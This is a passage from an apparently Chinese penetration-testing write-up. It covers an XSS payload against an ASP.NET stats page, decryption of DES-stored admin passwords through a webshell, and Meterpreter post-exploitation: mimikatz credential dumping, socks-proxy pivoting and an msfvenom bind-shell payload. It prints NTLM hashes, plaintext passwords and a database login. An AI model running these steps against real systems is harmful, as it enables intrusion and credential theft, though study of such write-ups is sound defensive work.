+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;c#&quot; runat=&quot;server&quot; %&gt;</span><br><span class="line">&lt;script language=&quot;c#&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">public string strStyle;</span><br><span class="line">public string strtheurl;</span><br><span class="line">public void Page_Load(Object src,EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">	NameValueCollection ServerVariables = Request.ServerVariables;</span><br><span class="line">	strStyle=Request.QueryString[&quot;style&quot;];</span><br><span class="line">	strtheurl=ServerVariables[&quot;URL&quot;].ToString();</span><br><span class="line">	strtheurl=strtheurl.Substring(0,strtheurl.IndexOf(&quot;mystat.aspx&quot;,0,strtheurl.Length));</span><br><span class="line">	strtheurl=&quot;http://&quot;+ServerVariables[&quot;HTTP_HOST&quot;].ToString()+strtheurl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">document.write(&quot;&lt;script&gt;var style=&#x27;&lt;%=strStyle%&gt;&#x27;;var url=&#x27;&lt;%=strtheurl%&gt;&#x27;;&lt;/script&gt;&quot;)</span><br><span class="line">_dwrite(&quot;&lt;script language=javascript src=&quot;+url+&quot;stat.aspx?style=&quot;+style+&quot;&amp;referer=&quot;+escape(document.referrer)+&quot;&amp;screenwidth=&quot;+(screen.width)+&quot;&gt;&lt;/script&gt;&quot;);</span><br><span class="line">function _dwrite(string) &#123;document.write(string);&#125;</span><br></pre></td></tr></table></figure>
+<p>如果直接输出会存在 XSS 漏洞，具体 payload 如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mystat.aspx?style=&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure>
+<p>成功弹出 XSS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-02%2003.58.11.png" alt="截屏2022-06-02 03.58.11"></p>
+<h4 id="后台用户密码解密"><a href="#后台用户密码解密" class="headerlink" title="后台用户密码解密"></a>后台用户密码解密</h4><p>在进行SQL注入获取用户密码时，未成功拿到用户密码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2001.15.51.png" alt="截屏2022-06-04 01.15.51"></p>
+<p>与此同时在站点目录<code>C:\HwsHostMaster\wwwroot\ww2cc123_55m39g\web</code>中发现网站配置文件<code>web.config</code>，其中包含数据库连接的账号密码<code>sa/!@#a123..</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.23.45.png" alt="截屏2022-06-04 00.23.45"></p>
+<p>在木马中连接数据库，查找对应的账号密码字段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin	AE5F6187F32825CA</span><br><span class="line">cc123	B97C57DB005F954242450A255217DA9F</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.28.34.png" alt="截屏2022-06-04 00.28.34"></p>
+<p>在<code>APP_Web_login.aspx</code>中发现密钥为<code>yx139222</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> sql = <span class="string">&quot;select * from admin where username=&#x27;&quot;</span> + username.Text.Trim() + <span class="string">&quot;&#x27; and password=&#x27;&quot;</span> + StringClass.Encrypt(password.Text.Trim(), <span class="string">&quot;yx139222&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>单击<code>Encrypt</code>跳转至加密函数当中，源代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Encrypt</span><span class="params">(<span class="built_in">string</span> pToEncrypt, <span class="built_in">string</span> sKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DESCryptoServiceProvider dESCryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">	byte[] bytes = Encoding.Default.GetBytes(pToEncrypt);</span><br><span class="line">	dESCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(sKey);</span><br><span class="line">	dESCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(sKey);</span><br><span class="line">	MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">	CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);</span><br><span class="line">	cryptoStream.Write(bytes, <span class="number">0</span>, bytes.Length);</span><br><span class="line">	cryptoStream.FlushFinalBlock();</span><br><span class="line">	StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	byte[] <span class="built_in">array</span> = memoryStream.ToArray();</span><br><span class="line">	foreach (byte b in <span class="built_in">array</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		stringBuilder.AppendFormat(<span class="string">&quot;&#123;0:X2&#125;&quot;</span>, b);</span><br><span class="line">	&#125;</span><br><span class="line">	stringBuilder.ToString();</span><br><span class="line">	<span class="keyword">return</span> stringBuilder.ToString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.44.04.png" alt="截屏2022-06-04 00.44.04"></p>
+<p>与此同时还发现了解密函数<code>Decrypt</code>，源代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Decrypt</span><span class="params">(<span class="built_in">string</span> pToDecrypt, <span class="built_in">string</span> sKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DESCryptoServiceProvider dESCryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">	byte[] <span class="built_in">array</span> = <span class="keyword">new</span> byte[pToDecrypt.Length / <span class="number">2</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pToDecrypt.Length / <span class="number">2</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> num = Convert.ToInt32(pToDecrypt.Substring(i * <span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line">		<span class="built_in">array</span>[i] = (byte)num;</span><br><span class="line">	&#125;</span><br><span class="line">	dESCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(sKey);</span><br><span class="line">	dESCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(sKey);</span><br><span class="line">	MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">	CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);</span><br><span class="line">	cryptoStream.Write(<span class="built_in">array</span>, <span class="number">0</span>, <span class="built_in">array</span>.Length);</span><br><span class="line">	cryptoStream.FlushFinalBlock();</span><br><span class="line">	<span class="keyword">new</span> StringBuilder();</span><br><span class="line">	<span class="keyword">return</span> Encoding.Default.GetString(memoryStream.ToArray());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>尝试通过 VS2019 来编写 DES 解密工具，说先选择 .net 框架为 4.5<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.50.27.png" alt="截屏2022-06-04 00.50.27"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2000.51.24.png" alt="截屏2022-06-04 00.51.24"></p>
+<p>创建控件绘制窗口UI，完成后如下<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2003.40.11.png" alt="截屏2022-06-04 03.40.11"></p>
+<p>将解密函数添加其中，与此同时添加执行脚本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Decrypt</span><span class="params">(<span class="built_in">string</span> pToDecrypt, <span class="built_in">string</span> sKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">button2_Click</span><span class="params">(object sender,EventArgs e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> password = textBox4.Text.Trim();</span><br><span class="line">    <span class="built_in">string</span> key = textBox2.Text.Trim();</span><br><span class="line">    textBox1.Text = Decrypt(password, key)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2003.53.56.png" alt="截屏2022-06-04 03.53.56"></p>
+<p>编译生成后运行，同时输入密文值<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2003.55.42.png" alt="截屏2022-06-04 03.55.42"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2003.57.27.png" alt="截屏2022-06-04 03.57.27"></p>
+<p>解密成功后获得如下账号密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin	AE5F6187F32825CA cc123</span><br><span class="line">cc123	B97C57DB005F954242450A255217DA9F qwasd123</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-内网横向渗透"><a href="#0x05-内网横向渗透" class="headerlink" title="0x05 内网横向渗透"></a>0x05 内网横向渗透</h2><h3 id="基础环境信息收集"><a href="#基础环境信息收集" class="headerlink" title="基础环境信息收集"></a>基础环境信息收集</h3><p>使用 MSF 执行命令可以发现目标存在两个IP</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ifconfig</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2004.54.29.png" alt="截屏2022-06-04 04.54.29"></p>
+<p>IP地址分别如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.134</span><br><span class="line">10.10.10.130</span><br></pre></td></tr></table></figure>
+
+<p>通过利用模块<code>get_local_subnets</code>查看当前网段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2004.55.14.png" alt="截屏2022-06-04 04.55.14"></p>
+<p>IP网段分别如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.0/24</span><br><span class="line">10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p>接下来要做的就是转移进程，查看当前主机进程</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.00.50.png" alt="截屏2022-06-04 05.00.50"></p>
+<p>成功将进程迁移到其他正常 SYSTEM 进程下<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.03.04.png" alt="截屏2022-06-04 05.03.04"></p>
+<p>使用 hashdump 获取哈希值，但是系统报错</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.06.09.png" alt="截屏2022-06-04 05.06.09"></p>
+<p>尝试通过 mimikatz 来获取明文密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; creds_msv</span><br><span class="line">meterpreter &gt; creds_kerberos</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.10.02.png" alt="截屏2022-06-04 05.10.02"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Username       Domain           NTLM                       SHA1                       LM</span><br><span class="line">--------       ------           ----                       ----                       --</span><br><span class="line">Administrator  WIN-KALKEMT3JMA  1c933df09b600efabee0791aa  ef773c356ba88403c1eabc39d  32801fe143b57a06b58412991</span><br><span class="line">                                ccc43f2                    dfd5cf33fb9a8f6            20d114d</span><br><span class="line">MySQL_HWS      WIN-KALKEMT3JMA  6a75a75e4cfd3cf00faf743e1  ccde64b1b93163969d778388f</span><br><span class="line">                                7e90a53                    08a131cea449f8d</span><br><span class="line">cc123          WIN-KALKEMT3JMA  afdeb425b4a55982deb4e80fa  279a2fa09ccdeb4578150600b  84fd84bc774b68b61271405ef</span><br><span class="line">                                3387576                    f92b9c2d4e76c75            a18e1ef</span><br><span class="line">newcc123       WIN-KALKEMT3JMA  97824315153b4dd665d6c688f  c993d52cb47bba40050187e3a</span><br><span class="line">                                446ebf1                    b6e440b0cd479c3</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.11.57.png" alt="截屏2022-06-04 05.11.57"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Username          Domain           Password</span><br><span class="line">--------          ------           --------</span><br><span class="line">(null)            (null)           (null)</span><br><span class="line">Administrator     WIN-KALKEMT3JMA  !@#Qwe123.</span><br><span class="line">MySQL_HWS         WIN-KALKEMT3JMA  5f 00 48 00 68 00 38 00 40 00 69 00 4f 00 77 00 40 00 40 00 54 00 73 00 37 0</span><br><span class="line">                                   0 59 00 4b 00 71 00 64 00 57 00 4a 00 32 00 09 ff 57 00 4a 00 32 00 77 00 6d</span><br><span class="line">                                    00 54 00 61 00 46 00 28 00</span><br><span class="line">cc123             WIN-KALKEMT3JMA  Ht6_ifp6nvkjn</span><br><span class="line">newcc123          WIN-KALKEMT3JMA  ZtKGmDj0qEbDECSBl5p</span><br><span class="line">newcc123          IIS APPPOOL      (null)</span><br><span class="line"><span class="meta">win-kalkemt3jma$</span><span class="bash">  WORKGROUP        (null)</span></span><br></pre></td></tr></table></figure>
+<p>如果需要查看相关帮助信息，可以在其中执行<code>help kiwi</code>命令</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2005.11.17.png" alt="截屏2022-06-04 05.11.17"></p>
+<h3 id="建立socks代理"><a href="#建立socks代理" class="headerlink" title="建立socks代理"></a>建立socks代理</h3><p>添加<code>10.10.10.0/24</code>内网路由段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+<p>查看当前已添加路由</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2014.58.27.png" alt="截屏2022-06-04 14.58.27"><br>运行模块<code>socks_proxy</code>建立 socks 代理</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use auxiliary/server/socks_proxy</span><br><span class="line">meterpreter &gt; set srvport 2222</span><br><span class="line">meterpreter &gt; show options</span><br><span class="line">meterpreter &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.02.24.png" alt="截屏2022-06-04 15.02.24"></p>
+<p>通过 proxychains 建立代理</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/local/etc/proxychains.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">配置</span></span><br><span class="line">socks5 127.0.0.1 2222</span><br></pre></td></tr></table></figure>
+
+<p>使用 nmap 通过代理进行扫描，测试成功</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn 10.10.10.131</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2015.51.41.png" alt="截屏2022-06-04 15.51.41"></p>
+<p>端口扫描结果如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/87eb37a9/%E6%88%AA%E5%B1%8F2022-06-04%2016.11.45.png" alt="截屏2022-06-04 16.11.45"></p>
+<h3 id="渗透数据库服务器"><a href="#渗透数据库服务器" class="headerlink" title="渗透数据库服务器"></a>渗透数据库服务器</h3><p>使用 MSF 生成正向连接木马</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=12222 -f exe &gt; mac2.exe</span><br></pre></td></tr></table></figure>
